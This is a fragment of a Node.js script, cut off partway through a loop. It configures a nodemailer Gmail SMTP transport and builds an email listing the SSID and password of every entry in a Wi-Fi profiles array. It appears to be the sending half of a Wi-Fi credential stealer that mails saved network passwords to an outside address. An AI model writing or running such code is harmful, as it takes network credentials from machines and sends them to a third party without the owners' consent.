  const transporter = nodemailer.createTransport({
    host:'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: emailFrom,
      pass: 'your_password',
    },
  });

  // create email message
  const message = {
    from: emailFrom,
    to: emailTo,
    subject: emailSubject,
    text: '',
  };

  // iterate over profiles array and add ssid and password to email message
  for (let i = 0; i < wifiProfiles.length; i++) {
    const profile = wifiProfiles[i];
    message.text += `ssid: ${profile.ssid}, password: ${profile.password}\n`;
